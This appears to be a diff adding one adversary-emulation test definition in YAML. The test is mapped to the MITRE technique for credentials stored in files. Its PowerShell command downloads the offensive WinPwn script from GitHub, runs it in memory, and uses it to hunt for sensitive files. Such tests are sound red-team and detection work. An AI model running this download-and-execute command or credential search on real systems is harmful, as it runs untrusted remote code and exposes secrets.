@@ -1,0 +1,13 @@
+- id: c9c46a8b-cfb8-56ab-9c2b-aaa3f7737d59
+  name: Soumaia ART Tests - WinPwn - sensitivefiles
+  description: Search for sensitive files on this local system using the SensitiveFiles function of WinPwn
+  tactic: credential-access
+  technique:
+    attack_id: T1552.001
+    name: 'Unsecured Credentials: Credentials In Files'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+          sensitivefiles -noninteractive -consoleoutput
